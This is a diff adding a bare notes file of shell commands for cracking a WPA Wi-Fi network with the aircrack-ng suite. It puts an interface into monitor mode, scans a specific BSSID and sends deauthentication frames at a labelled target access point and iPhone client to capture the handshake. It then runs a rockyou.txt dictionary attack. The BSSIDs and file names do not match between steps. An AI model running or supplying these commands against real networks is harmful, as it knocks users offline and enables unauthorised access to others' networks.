@@ -1,0 +1,21 @@
+sudo ifconfig wlan0 down
+
+sudo iwconfig wlan0 mode monitor
+
+sudo ifconfig wlan0 up
+
+
+sudo airodump-ng wlan0
+
+sudo airodump-ng --bssid 0C:83:9A:35:F7:71 --channel 12 wlan0
+
+
+
+
+sudo aireplay-ng --deauth 5 -a B4:A7:C6:56:64:C3(Target)-c 94:E6:F7:0C:E8:60(iphone) wlan0   ----- handshake
+
+
+sudo airodump-ng --bssid 0C:83:9A:35:F7:71 --channel 12 wlan0 -w target_handshake
+
+
+sudo aircrack-ng target-01.cap -w rockyou.txt
